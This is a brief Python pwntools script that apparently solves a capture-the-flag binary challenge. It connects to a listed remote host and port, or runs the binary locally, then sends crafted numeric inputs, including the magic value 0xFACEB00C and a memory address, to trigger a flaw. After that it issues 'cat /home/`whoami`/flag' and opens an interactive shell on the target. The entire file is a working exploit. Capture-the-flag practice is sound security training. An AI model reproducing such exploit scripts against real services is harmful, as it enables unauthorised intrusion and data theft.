#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './binary'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2117

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

s1 = 0x1 + 0x100000
s2_1 = 0x64
s2_2 = 0x100
s2_3 = 0xFACEB00C
s3 = 0x60107c
r.sendline(str(s1))
r.sendline(str(s2_1) + ' ' + str(s2_2) + ' ' + str(s2_3))
r.sendline(str(s3))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
r.close()
